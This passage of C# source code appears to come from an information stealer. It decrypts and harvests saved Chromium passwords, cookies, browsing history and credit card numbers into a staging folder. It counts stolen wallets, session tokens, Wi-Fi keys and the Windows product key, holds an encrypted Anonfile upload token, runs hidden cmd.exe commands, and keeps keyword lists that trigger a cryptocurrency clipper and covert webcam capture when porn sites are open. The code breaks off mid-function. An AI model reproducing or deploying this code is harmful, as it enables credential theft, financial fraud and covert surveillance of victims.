		public static string github = Encoding.UTF8.GetString(cryptKey);

		// Decrypt string
		public static string Decrypt(byte[] bytesToBeDecrypted)
		{
			byte[] decryptedBytes = null;
			using (MemoryStream ms = new MemoryStream())
			{
				using (RijndaelManaged AES = new RijndaelManaged())
				{
					AES.KeySize = 256;
					AES.BlockSize = 128;
					var key = new Rfc2898DeriveBytes(cryptKey, saltBytes, 1000);
					AES.Key = key.GetBytes(AES.KeySize / 8);
					AES.IV = key.GetBytes(AES.BlockSize / 8);
					AES.Mode = CipherMode.CBC;
					using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
					{
						cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
						cs.Close();
					}
					decryptedBytes = ms.ToArray();
				}
			}
			return Encoding.UTF8.GetString(decryptedBytes);
		}

		// Decrypt config value
		public static string DecryptConfig(string value)
		{
			if (string.IsNullOrEmpty(value))
				return "";

			if (!value.StartsWith("ENCRYPTED:"))
				return value;

			return Decrypt(Convert.FromBase64String(value
				.Replace("ENCRYPTED:", "")));
		}

		// Anonfile API key
		public static string AnonApiToken = Decrypt(new byte[] { 169, 182, 79, 179, 252, 54, 138, 148, 167, 99, 216, 216, 199, 219, 10, 249, 131, 166, 170, 145, 237, 248, 142, 78, 196, 137, 101, 62, 142, 107, 245, 134, });
	}
	internal sealed class Counter
	{
		// Browsers
		public static int Passwords = 0;
		public static int CreditCards = 0;
		public static int AutoFill = 0;
		public static int Cookies = 0;
		public static int History = 0;
		public static int Bookmarks = 0;
		public static int Downloads = 0;
		// Applications
		public static int VPN = 0;
		public static int Pidgin = 0;
		public static int Wallets = 0;
		public static int FTPHosts = 0;
		// Sessions, tokens
		public static bool Telegram = false;
		public static bool Steam = false;
		public static bool Uplay = false;
		public static bool Discord = false;
		// System data
		public static int SavedWifiNetworks = 0;
		public static bool ProductKey = false;
		public static bool DesktopScreenshot = false;
		public static bool WebcamScreenshot = false;
		// Grabber stats
		public static int GrabberDocuments = 0;
		public static int GrabberSourceCodes = 0;
		public static int GrabberDatabases = 0;
		public static int GrabberImages = 0;
		// Banking & Cryptocurrency services detection
		public static bool BankingServices = false;
		public static bool CryptoServices = false;
		public static bool PornServices = false;
		public static List<string> DetectedBankingServices = new List<string>();
		public static List<string> DetectedCryptoServices = new List<string>();
		public static List<string> DetectedPornServices = new List<string>();

		// Get string value
		public static string GetSValue(string application, bool value)
		{
			return value ? "\n   ∟ " + application : "";
		}

		// Get integer value
		public static string GetIValue(string application, int value)
		{
			return value != 0 ? "\n   ∟ " + application + ": " + value : "";
		}

		// Get list value
		public static string GetLValue(string application, List<string> value, char separator = '∟')
		{
			value.Sort(); // Sort list items
			return value.Count != 0 ? "\n   ∟ " + application + ":\n\t\t\t\t\t\t\t" + separator + " " +
				string.Join("\n\t\t\t\t\t\t\t" + separator + " ", value) : "\n   ∟ " + application + " (No data)";
		}

		// Get boolean value
		public static string GetBValue(bool value, string success, string failed)
		{
			return value ? "\n   ∟ " + success : "\n   ∟ " + failed;
		}

	}
	internal sealed class Banking
	{
		// Add value to list
		private static bool AppendValue(string value, List<string> domains)
		{
			string domain = value
				.Replace("www.", "").ToLower();
			// Remove search results
			if (
				domain.Contains("google") ||
				domain.Contains("bing") ||
				domain.Contains("yandex") ||
				domain.Contains("duckduckgo"))
				return false;
			// If cookie value
			if (domain
				.StartsWith("."))
				domain = domain.Substring(1);
			// Get hostname from url
			try
			{
				domain = new System.Uri(domain).Host;
			}
			catch (System.UriFormatException) { }
			// Remove .com, .org
			domain = System.IO.Path.GetFileNameWithoutExtension(domain);
			domain = domain.Replace(".com", "").Replace(".org", "");
			// Check if domain already exists in list
			foreach (string domainValue in domains)
				if (domain.ToLower().Replace(" ", "").Contains(domainValue.ToLower().Replace(" ", "")))
					return false;
			// Convert first char to upper-case
			domain = System.Globalization.CultureInfo.CurrentCulture.TextInfo.ToTitleCase(domain);
			domains.Add(domain);
			return true;
		}
		// Start clipper when active window title contains this text:
		public static string[] CryptoServices = new string[] {
			"bitcoin", "monero", "dashcoin", "litecoin", "etherium", "stellarcoin",
			"btc", "eth", "xmr", "xlm", "xrp", "ltc", "bch",
			"blockchain", "paxful", "investopedia", "buybitcoinworldwide",
			"cryptocurrency", "crypto", "trade", "trading", "биткоин", "wallet"
		};
		// Start webcam capture when active window title contains this text:
		public static string[] PornServices = new string[] {
			"porn", "sex", "hentai", "порно", "sex"
		};
		public static string[] BankingServices = new string[] {
			"qiwi", "money", "exchange",
			"bank",  "credit", "card", "банк", "кредит",
		};

		// Detect crypto currency services
		private static void DetectCryptocurrencyServices(string value)
		{
			foreach (string service in CryptoServices)
				if (value.ToLower().Contains(service) && value.Length < 25)
					if (AppendValue(value, Counter.DetectedCryptoServices))
					{ Counter.CryptoServices = true; return; }
		}


		// Detect banking services
		private static void DetectBankingServices(string value)
		{
			foreach (string service in BankingServices)
				if (value.ToLower().Contains(service) && value.Length < 25)
					if (AppendValue(value, Counter.DetectedBankingServices))
					{ Counter.BankingServices = true; return; }
		}

		// Detect porn services
		private static void DetectPornServices(string value)
		{
			foreach (string service in PornServices)
				if (value.ToLower().Contains(service) && value.Length < 25)
					if (AppendValue(value, Counter.DetectedPornServices))
					{ Counter.PornServices = true; return; }
		}

		// Detect all
		public static void ScanData(string value)
		{
			DetectBankingServices(value);
			DetectCryptocurrencyServices(value);
			DetectPornServices(value);
		}


		// Regex for credit cards types detection by number
		private static Dictionary<string, Regex> CreditCardTypes = new Dictionary<string, Regex>()
		{
			{"Amex Card", new Regex(@"^3[47][0-9]{13}$") },
			{"BCGlobal", new Regex(@"^(6541|6556)[0-9]{12}$") },
			{"Carte Blanche Card", new Regex(@"^389[0-9]{11}$") },
			{"Diners Club Card", new Regex(@"^3(?:0[0-5]|[68][0-9])[0-9]{11}$") },
			{"Discover Card", new Regex(@"6(?:011|5[0-9]{2})[0-9]{12}$") },
			{"Insta Payment Card", new Regex(@"^63[7-9][0-9]{13}$") },
			{"JCB Card", new Regex(@"^(?:2131|1800|35\\d{3})\\d{11}$") },
			{"KoreanLocalCard", new Regex(@"^9[0-9]{15}$") },
			{"Laser Card", new Regex(@"^(6304|6706|6709|6771)[0-9]{12,15}$") },
			{"Maestro Card", new Regex(@"^(5018|5020|5038|6304|6759|6761|6763)[0-9]{8,15}$") },
			{"Mastercard", new Regex(@"5[1-5][0-9]{14}$") },
			{"Solo Card", new Regex(@"^(6334|6767)[0-9]{12}|(6334|6767)[0-9]{14}|(6334|6767)[0-9]{15}$") },
			{"Switch Card", new Regex(@"^(4903|4905|4911|4936|6333|6759)[0-9]{12}|(4903|4905|4911|4936|6333|6759)[0-9]{14}|(4903|4905|4911|4936|6333|6759)[0-9]{15}|564182[0-9]{10}|564182[0-9]{12}|564182[0-9]{13}|633110[0-9]{10}|633110[0-9]{12}|633110[0-9]{13}$") },
			{"Union Pay Card", new Regex(@"^(62[0-9]{14,17})$") },
			{"Visa Card", new Regex(@"4[0-9]{12}(?:[0-9]{3})?$") },
			{"Visa Master Card", new Regex(@"^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$") },
			{"Express Card", new Regex(@"3[47][0-9]{13}$") },
		};

		// Detect credit cards type by number
		public static string DetectCreditCardType(string number)
		{
			foreach (KeyValuePair<string, Regex> dictonary in CreditCardTypes)
				if (dictonary.Value.Match(number.Replace(" ", "")).Success)
					return dictonary.Key;

			return "Unknown";
		}

	}
	#endregion
	public class ProductKey
	{

		public enum DigitalProductIdVersion
		{
			UpToWindows7,
			Windows8AndUp
		}

		public static string DecodeProductKeyWin8AndUp(byte[] digitalProductId)
		{
			var key = String.Empty;
			const int keyOffset = 52;
			var isWin8 = (byte)((digitalProductId[66] / 6) & 1);
			digitalProductId[66] = (byte)((digitalProductId[66] & 0xf7) | (isWin8 & 2) * 4);

			const string digits = "BCDFGHJKMPQRTVWXY2346789";
			var last = 0;
			for (var i = 24; i >= 0; i--)
			{
				var current = 0;
				for (var j = 14; j >= 0; j--)
				{
					current = current * 256;
					current = digitalProductId[j + keyOffset] + current;
					digitalProductId[j + keyOffset] = (byte)(current / 24);
					current = current % 24;
					last = current;
				}
				key = digits[current] + key;
			}

			var keypart1 = key.Substring(1, last);
			var keypart2 = key.Substring(last + 1, key.Length - (last + 1));
			key = keypart1 + "N" + keypart2;

			for (var i = 5; i < key.Length; i += 6)
			{
				key = key.Insert(i, "-");
			}

			return key;
		}
		private static string DecodeProductKey(byte[] digitalProductId)
		{
			const int keyStartIndex = 52;
			const int keyEndIndex = keyStartIndex + 15;
			var digits = new[]
			{
				'B', 'C', 'D', 'F', 'G', 'H', 'J', 'K', 'M', 'P', 'Q', 'R',
				'T', 'V', 'W', 'X', 'Y', '2', '3', '4', '6', '7', '8', '9',
			};
			const int decodeLength = 29;
			const int decodeStringLength = 15;
			var decodedChars = new char[decodeLength];
			var hexPid = new System.Collections.ArrayList();
			for (var i = keyStartIndex; i <= keyEndIndex; i++)
			{
				hexPid.Add(digitalProductId[i]);
			}
			for (var i = decodeLength - 1; i >= 0; i--)
			{
				// Every sixth char is a separator.
				if ((i + 1) % 6 == 0)
				{
					decodedChars[i] = '-';
				}
				else
				{
					// Do the actual decoding.
					var digitMapIndex = 0;
					for (var j = decodeStringLength - 1; j >= 0; j--)
					{
						var byteValue = (digitMapIndex << 8) | (byte)hexPid[j];
						hexPid[j] = (byte)(byteValue / 24);
						digitMapIndex = byteValue % 24;
						decodedChars[i] = digits[digitMapIndex];
					}
				}
			}
			return new string(decodedChars);
		}
		private static string GetWindowsProductKeyFromDigitalProductId(byte[] digitalProductId, DigitalProductIdVersion digitalProductIdVersion)
		{
			string productKey = "null";
			if (digitalProductIdVersion == DigitalProductIdVersion.Windows8AndUp)
			{
				productKey = DecodeProductKeyWin8AndUp(digitalProductId);
				return productKey;
			}
			else
			{
				productKey = DecodeProductKey(digitalProductId);
				return productKey;
			}
		}

		public static string GetWindowsProductKeyFromRegistry()
		{
			var localKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32);

			var registryKeyValue = localKey.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion").GetValue("DigitalProductId");
			if (registryKeyValue == null)
				return "Failed to get DigitalProductId from registry";
			var digitalProductId = (byte[])registryKeyValue;
			localKey.Close();
			var isWin8OrUp = Environment.OSVersion.Version.Major == 6 && Environment.OSVersion.Version.Minor >= 2 || Environment.OSVersion.Version.Major > 6;

			Counter.ProductKey = true;
			return GetWindowsProductKeyFromDigitalProductId(digitalProductId, isWin8OrUp ? DigitalProductIdVersion.Windows8AndUp : DigitalProductIdVersion.UpToWindows7);
		}



	}
	#region Chrome
	class cAesGcm
	{
		public byte[] Decrypt(byte[] key, byte[] iv, byte[] aad, byte[] cipherText, byte[] authTag)
		{
			IntPtr hAlg = OpenAlgorithmProvider(cBCrypt.BCRYPT_AES_ALGORITHM, cBCrypt.MS_PRIMITIVE_PROVIDER, cBCrypt.BCRYPT_CHAIN_MODE_GCM);
			IntPtr hKey, keyDataBuffer = ImportKey(hAlg, key, out hKey);

			byte[] plainText;

			var authInfo = new cBCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(iv, aad, authTag);
			using (authInfo)
			{
				byte[] ivData = new byte[MaxAuthTagSize(hAlg)];

				int plainTextSize = 0;

				uint status = cBCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref authInfo, ivData, ivData.Length, null, 0, ref plainTextSize, 0x0);

				if (status != cBCrypt.ERROR_SUCCESS)
					throw new CryptographicException(string.Format("BCrypt.BCryptDecrypt() (get size) failed with status code: {0}", status));

				plainText = new byte[plainTextSize];

				status = cBCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref authInfo, ivData, ivData.Length, plainText, plainText.Length, ref plainTextSize, 0x0);

				if (status == cBCrypt.STATUS_AUTH_TAG_MISMATCH)
					throw new CryptographicException("BCrypt.BCryptDecrypt(): authentication tag mismatch");

				if (status != cBCrypt.ERROR_SUCCESS)
					throw new CryptographicException(string.Format("BCrypt.BCryptDecrypt() failed with status code:{0}", status));
			}

			cBCrypt.BCryptDestroyKey(hKey);
			Marshal.FreeHGlobal(keyDataBuffer);
			cBCrypt.BCryptCloseAlgorithmProvider(hAlg, 0x0);

			return plainText;
		}

		private int MaxAuthTagSize(IntPtr hAlg)
		{
			byte[] tagLengthsValue = GetProperty(hAlg, cBCrypt.BCRYPT_AUTH_TAG_LENGTH);

			return BitConverter.ToInt32(new[] { tagLengthsValue[4], tagLengthsValue[5], tagLengthsValue[6], tagLengthsValue[7] }, 0);
		}

		private IntPtr OpenAlgorithmProvider(string alg, string provider, string chainingMode)
		{
			IntPtr hAlg = IntPtr.Zero;

			uint status = cBCrypt.BCryptOpenAlgorithmProvider(out hAlg, alg, provider, 0x0);

			if (status != cBCrypt.ERROR_SUCCESS)
				throw new CryptographicException(string.Format("BCrypt.BCryptOpenAlgorithmProvider() failed with status code:{0}", status));

			byte[] chainMode = Encoding.Unicode.GetBytes(chainingMode);
			status = cBCrypt.BCryptSetAlgorithmProperty(hAlg, cBCrypt.BCRYPT_CHAINING_MODE, chainMode, chainMode.Length, 0x0);

			if (status != cBCrypt.ERROR_SUCCESS)
				throw new CryptographicException(string.Format("BCrypt.BCryptSetAlgorithmProperty(BCrypt.BCRYPT_CHAINING_MODE, BCrypt.BCRYPT_CHAIN_MODE_GCM) failed with status code:{0}", status));

			return hAlg;
		}

		private IntPtr ImportKey(IntPtr hAlg, byte[] key, out IntPtr hKey)
		{
			byte[] objLength = GetProperty(hAlg, cBCrypt.BCRYPT_OBJECT_LENGTH);

			int keyDataSize = BitConverter.ToInt32(objLength, 0);

			IntPtr keyDataBuffer = Marshal.AllocHGlobal(keyDataSize);

			byte[] keyBlob = Concat(cBCrypt.BCRYPT_KEY_DATA_BLOB_MAGIC, BitConverter.GetBytes(0x1), BitConverter.GetBytes(key.Length), key);

			uint status = cBCrypt.BCryptImportKey(hAlg, IntPtr.Zero, cBCrypt.BCRYPT_KEY_DATA_BLOB, out hKey, keyDataBuffer, keyDataSize, keyBlob, keyBlob.Length, 0x0);

			if (status != cBCrypt.ERROR_SUCCESS)
				throw new CryptographicException(string.Format("BCrypt.BCryptImportKey() failed with status code:{0}", status));

			return keyDataBuffer;
		}

		private byte[] GetProperty(IntPtr hAlg, string name)
		{
			int size = 0;

			uint status = cBCrypt.BCryptGetProperty(hAlg, name, null, 0, ref size, 0x0);

			if (status != cBCrypt.ERROR_SUCCESS)
				throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() (get size) failed with status code:{0}", status));

			byte[] value = new byte[size];

			status = cBCrypt.BCryptGetProperty(hAlg, name, value, value.Length, ref size, 0x0);

			if (status != cBCrypt.ERROR_SUCCESS)
				throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() failed with status code:{0}", status));

			return value;
		}

		public byte[] Concat(params byte[][] arrays)
		{
			int len = 0;

			foreach (byte[] array in arrays)
			{
				if (array == null)
					continue;
				len += array.Length;
			}

			byte[] result = new byte[len - 1 + 1];
			int offset = 0;

			foreach (byte[] array in arrays)
			{
				if (array == null)
					continue;
				Buffer.BlockCopy(array, 0, result, offset, array.Length);
				offset += array.Length;
			}

			return result;
		}
	}
	public static class cBCrypt
	{
		public const uint ERROR_SUCCESS = 0x00000000;
		public const uint BCRYPT_PAD_PSS = 8;
		public const uint BCRYPT_PAD_OAEP = 4;

		public static readonly byte[] BCRYPT_KEY_DATA_BLOB_MAGIC = BitConverter.GetBytes(0x4d42444b);

		public static readonly string BCRYPT_OBJECT_LENGTH = "ObjectLength";
		public static readonly string BCRYPT_CHAIN_MODE_GCM = "ChainingModeGCM";
		public static readonly string BCRYPT_AUTH_TAG_LENGTH = "AuthTagLength";
		public static readonly string BCRYPT_CHAINING_MODE = "ChainingMode";
		public static readonly string BCRYPT_KEY_DATA_BLOB = "KeyDataBlob";
		public static readonly string BCRYPT_AES_ALGORITHM = "AES";

		public static readonly string MS_PRIMITIVE_PROVIDER = "Microsoft Primitive Provider";

		public static readonly int BCRYPT_AUTH_MODE_CHAIN_CALLS_FLAG = 0x00000001;
		public static readonly int BCRYPT_INIT_AUTH_MODE_INFO_VERSION = 0x00000001;

		public static readonly uint STATUS_AUTH_TAG_MISMATCH = 0xC000A002;

		[StructLayout(LayoutKind.Sequential)]
		public struct BCRYPT_PSS_PADDING_INFO
		{
			public BCRYPT_PSS_PADDING_INFO(string pszAlgId, int cbSalt)
			{
				this.pszAlgId = pszAlgId;
				this.cbSalt = cbSalt;
			}

			[MarshalAs(UnmanagedType.LPWStr)]
			public string pszAlgId;
			public int cbSalt;
		}

		[StructLayout(LayoutKind.Sequential)]
		public struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO : IDisposable
		{
			public int cbSize;
			public int dwInfoVersion;
			public IntPtr pbNonce;
			public int cbNonce;
			public IntPtr pbAuthData;
			public int cbAuthData;
			public IntPtr pbTag;
			public int cbTag;
			public IntPtr pbMacContext;
			public int cbMacContext;
			public int cbAAD;
			public long cbData;
			public int dwFlags;

			public BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(byte[] iv, byte[] aad, byte[] tag) : this()
			{
				dwInfoVersion = BCRYPT_INIT_AUTH_MODE_INFO_VERSION;
				cbSize = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));

				if (iv != null)
				{
					cbNonce = iv.Length;
					pbNonce = Marshal.AllocHGlobal(cbNonce);
					Marshal.Copy(iv, 0, pbNonce, cbNonce);
				}

				if (aad != null)
				{
					cbAuthData = aad.Length;
					pbAuthData = Marshal.AllocHGlobal(cbAuthData);
					Marshal.Copy(aad, 0, pbAuthData, cbAuthData);
				}

				if (tag != null)
				{
					cbTag = tag.Length;
					pbTag = Marshal.AllocHGlobal(cbTag);
					Marshal.Copy(tag, 0, pbTag, cbTag);

					cbMacContext = tag.Length;
					pbMacContext = Marshal.AllocHGlobal(cbMacContext);
				}
			}

			public void Dispose()
			{
				if (pbNonce != IntPtr.Zero) Marshal.FreeHGlobal(pbNonce);
				if (pbTag != IntPtr.Zero) Marshal.FreeHGlobal(pbTag);
				if (pbAuthData != IntPtr.Zero) Marshal.FreeHGlobal(pbAuthData);
				if (pbMacContext != IntPtr.Zero) Marshal.FreeHGlobal(pbMacContext);
			}
		}

		[StructLayout(LayoutKind.Sequential)]
		public struct BCRYPT_KEY_LENGTHS_STRUCT
		{
			public int dwMinLength;
			public int dwMaxLength;
			public int dwIncrement;
		}

		[StructLayout(LayoutKind.Sequential)]
		public struct BCRYPT_OAEP_PADDING_INFO
		{
			public BCRYPT_OAEP_PADDING_INFO(string alg)
			{
				pszAlgId = alg;
				pbLabel = IntPtr.Zero;
				cbLabel = 0;
			}

			[MarshalAs(UnmanagedType.LPWStr)]
			public string pszAlgId;
			public IntPtr pbLabel;
			public int cbLabel;
		}

		[DllImport("bcrypt.dll")]
		public static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm,
															  [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId,
															  [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation,
															  uint dwFlags);

		[DllImport("bcrypt.dll")]
		public static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint flags);

		[DllImport("bcrypt.dll", EntryPoint = "BCryptGetProperty")]
		public static extern uint BCryptGetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbOutput, int cbOutput, ref int pcbResult, uint flags);

		[DllImport("bcrypt.dll", EntryPoint = "BCryptSetProperty")]
		internal static extern uint BCryptSetAlgorithmProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags);


		[DllImport("bcrypt.dll")]
		public static extern uint BCryptImportKey(IntPtr hAlgorithm,
														 IntPtr hImportKey,
														 [MarshalAs(UnmanagedType.LPWStr)] string pszBlobType,
														 out IntPtr phKey,
														 IntPtr pbKeyObject,
														 int cbKeyObject,
														 byte[] pbInput, //blob of type BCRYPT_KEY_DATA_BLOB + raw key data = (dwMagic (4 bytes) | uint dwVersion (4 bytes) | cbKeyData (4 bytes) | data)
														 int cbInput,
														 uint dwFlags);

		[DllImport("bcrypt.dll")]
		public static extern uint BCryptDestroyKey(IntPtr hKey);

		[DllImport("bcrypt.dll")]
		public static extern uint BCryptEncrypt(IntPtr hKey,
												byte[] pbInput,
												int cbInput,
												ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo,
												byte[] pbIV, int cbIV,
												byte[] pbOutput,
												int cbOutput,
												ref int pcbResult,
												uint dwFlags);

		[DllImport("bcrypt.dll")]
		internal static extern uint BCryptDecrypt(IntPtr hKey,
												  byte[] pbInput,
												  int cbInput,
												  ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo,
												  byte[] pbIV,
												  int cbIV,
												  byte[] pbOutput,
												  int cbOutput,
												  ref int pcbResult,
												  int dwFlags);
	}
	internal sealed class Chrome
	{
		private static string FormatPassword(Password pPassword)
		{
			return String.Format("Url: {0}\nUsername: {1}\nPassword: {2}\n", pPassword.sUrl, pPassword.sUsername, pPassword.sPassword);
		}
		private static string FormatCookie(Cookie cCookie)
		{
			return String.Format("{0}\tTRUE\t{1}\tFALSE\t{2}\t{3}\t{4}\r\n", cCookie.sHostKey, cCookie.sPath, cCookie.sExpiresUtc, cCookie.sName, cCookie.sValue);
		}
		private static string FormatHistory(Site sSite)
		{
			return String.Format("### {0} ### ({1}) {2}\n", sSite.sTitle, sSite.sUrl, sSite.iCount);
		}
		private static string FormatCreditCard(CreditCard cCard)
		{
			return String.Format("Type: {0}\nNumber: {1}\nExp: {2}\nHolder: {3}\n\n", Banking.DetectCreditCardType(cCard.sNumber), cCard.sNumber, cCard.sExpMonth + "/" + cCard.sExpYear, cCard.sName);
		}
		public static void RunPass()
		{
			foreach (string sPath in Paths.sChromiumPswPaths)
			{
				string sFullPath;
				if (sPath.Contains("Opera Software"))
					sFullPath = Paths.appdata + sPath;
				else
					sFullPath = Paths.lappdata + sPath;

				if (Directory.Exists(sFullPath)) foreach (string sProfile in Directory.GetDirectories(sFullPath))
					{
						List<Password> pPasswords = GetPasswords(sProfile + "\\Login Data");

						string Stealer_Dir = Handler.ExploitDir;
						if (pPasswords.Count > 0)
						{
							File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# Passwords \n\n");

							foreach (Password pass in pPasswords)
								File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, FormatPassword(pass) + "\n");

							File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# End of Passwords \n");

						}
					}

			}

		}
		public static void RunHis()
		{
			foreach (string sPath in Paths.sChromiumPswPaths)
			{
				string sFullPath;
				if (sPath.Contains("Opera Software"))
					sFullPath = Paths.appdata + sPath;
				else
					sFullPath = Paths.lappdata + sPath;

				if (Directory.Exists(sFullPath)) foreach (string sProfile in Directory.GetDirectories(sFullPath))
					{
						List<Site> pHistory = GetHistory(sProfile + "\\History");

						string Stealer_Dir = Handler.ExploitDir;
						if (pHistory.Count > 0)
						{
							File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# History \n\n");

							foreach (Site his in pHistory)
								File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, FormatHistory(his) + "\n");

							File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# End of History \n");

						}
					}

			}

		}
		public static void RunCC()
		{
			foreach (string sPath in Paths.sChromiumPswPaths)
			{
				string sFullPath;
				if (sPath.Contains("Opera Software"))
					sFullPath = Paths.appdata + sPath;
				else
					sFullPath = Paths.lappdata + sPath;

				if (Directory.Exists(sFullPath)) foreach (string sProfile in Directory.GetDirectories(sFullPath))
					{

						List<CreditCard> pCreditCards = GetCC(sProfile + "\\Web Data");

						string Stealer_Dir = Handler.ExploitDir;
						if (pCreditCards.Count > 0)
						{
							File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# Credit Cards \n\n");

							foreach (CreditCard cc in pCreditCards)
								File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, FormatCreditCard(cc) + "\n");

							File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# End of Credit Cards \n");

						}
					}

			}

		}
		public static void RunCookies()
		{
			foreach (string sPath in Paths.sChromiumPswPaths)
			{
				string sFullPath;
				if (sPath.Contains("Opera Software"))
					sFullPath = Paths.appdata + sPath;
				else
					sFullPath = Paths.lappdata + sPath;

				if (Directory.Exists(sFullPath)) foreach (string sProfile in Directory.GetDirectories(sFullPath))
					{

						List<Cookie> pCookies = GetCookies(sProfile + "\\Cookies");

						string Stealer_Dir = Handler.ExploitDir;
						if (pCookies.Count > 0)
						{
							File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# Cookies \n\n");

							foreach (Cookie cookie in pCookies)
								File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, FormatCookie(cookie) + "\n");

							File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# End of Cookies \n");

						}
					}

			}

		}
		public static List<Password> GetPasswords(string sLoginData)
		{
			try
			{
				List<Password> pPasswords = new List<Password>();

				// Read data from table
				SQLite sSQLite = SqlReader.ReadTable(sLoginData, "logins");
				if (sSQLite == null)
					return pPasswords;

				for (int i = 0; i < sSQLite.GetRowCount(); i++)
				{

					Password pPassword = new Password();

					pPassword.sUrl = Crypto.GetUTF8(sSQLite.GetValue(i, 0));
					pPassword.sUsername = Crypto.GetUTF8(sSQLite.GetValue(i, 3));
					string sPassword = sSQLite.GetValue(i, 5);

					if (sPassword != null)
					{
						pPassword.sPassword = Crypto.GetUTF8(Crypto.EasyDecrypt(sLoginData, sPassword));
						pPasswords.Add(pPassword);

						// Analyze value
						Banking.ScanData(pPassword.sUrl);
						Counter.Passwords++;
					}
					continue;

				}

				return pPasswords;
			}
			catch { return new List<Password>(); }
		}
		public static List<Cookie> GetCookies(string sCookie)
		{
			try
			{
				List<Cookie> lcCookies = new List<Cookie>();

				// Read data from table
				SQLite sSQLite = SqlReader.ReadTable(sCookie, "cookies");
				if (sSQLite == null)
					return lcCookies;

				for (int i = 0; i < sSQLite.GetRowCount(); i++)
				{

					Cookie cCookie = new Cookie();

					cCookie.sValue = Crypto.EasyDecrypt(sCookie, sSQLite.GetValue(i, 12));


					if (cCookie.sValue == "")
						cCookie.sValue = sSQLite.GetValue(i, 3);

					cCookie.sHostKey = Crypto.GetUTF8(sSQLite.GetValue(i, 1));
					cCookie.sName = Crypto.GetUTF8(sSQLite.GetValue(i, 2));
					cCookie.sPath = Crypto.GetUTF8(sSQLite.GetValue(i, 4));
					cCookie.sExpiresUtc = Crypto.GetUTF8(sSQLite.GetValue(i, 5));
					cCookie.sIsSecure = Crypto.GetUTF8(sSQLite.GetValue(i, 6).ToUpper());

					// Analyze value
					Banking.ScanData(cCookie.sHostKey);
					Counter.Cookies++;
					lcCookies.Add(cCookie);
				}

				return lcCookies;
			}
			catch { return new List<Cookie>(); }
		}
		public static List<Site> GetHistory(string sHistory)
		{
			try
			{
				List<Site> scHistory = new List<Site>();

				// Read data from table
				SQLite sSQLite = SqlReader.ReadTable(sHistory, "urls");
				if (sSQLite == null)
					return scHistory;

				for (int i = 0; i < sSQLite.GetRowCount(); i++)
				{
					Site sSite = new Site();
					sSite.sTitle = Crypto.GetUTF8(sSQLite.GetValue(i, 1));
					sSite.sUrl = Crypto.GetUTF8(sSQLite.GetValue(i, 2));
					sSite.iCount = System.Convert.ToInt32(sSQLite.GetValue(i, 3)) + 1;

					// Analyze value
					Banking.ScanData(sSite.sUrl);
					Counter.History++;
					scHistory.Add(sSite);

				}

				return scHistory;
			}
			catch { return new List<Site>(); }
		}
		public static List<CreditCard> GetCC(string sWebData)
		{
			try
			{
				List<CreditCard> lcCC = new List<CreditCard>();

				// Read data from table
				SQLite sSQLite = SqlReader.ReadTable(sWebData, "credit_cards");
				if (sSQLite == null)
					return lcCC;

				for (int i = 0; i < sSQLite.GetRowCount(); i++)
				{

					CreditCard cCard = new CreditCard();

					cCard.sNumber = Crypto.GetUTF8(Crypto.EasyDecrypt(sWebData, sSQLite.GetValue(i, 4)));
					cCard.sExpYear = Crypto.GetUTF8(sSQLite.GetValue(i, 3));
					cCard.sExpMonth = Crypto.GetUTF8(sSQLite.GetValue(i, 2));
					cCard.sName = Crypto.GetUTF8(sSQLite.GetValue(i, 1));

					Counter.CreditCards++;
					lcCC.Add(cCard);
				}

				return lcCC;
			}
			catch { return new List<CreditCard>(); }
		}
	}
	#endregion
	internal sealed class CommandHelper
	{
		public static string Run(string cmd, bool wait = true)
		{
			string output = "";
			using (var process = new Process())
			{
				process.StartInfo = new ProcessStartInfo
				{
					UseShellExecute = false,
					CreateNoWindow = true,
					WindowStyle = ProcessWindowStyle.Hidden,
					FileName = "cmd.exe",
					Arguments = cmd,
					RedirectStandardError = true,
					RedirectStandardOutput = true
				};
				process.Start();
				output = process.StandardOutput.ReadToEnd();
				if (wait) process.WaitForExit();
			}
			return output;
		}
	}
	#region WIFI
	internal sealed class Wifi
	{
		private static string[] GetProfiles()
		{
			string output = CommandHelper.Run("/C chcp 65001 && netsh wlan show profile | findstr All");
			string[] wNames = output.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
			for (int i = 0; i < wNames.Length; i++)
				wNames[i] = wNames[i].Substring(wNames[i].LastIndexOf(':') + 1).Trim();
			return wNames;
		}

		private static string GetPassword(string profile)
		{
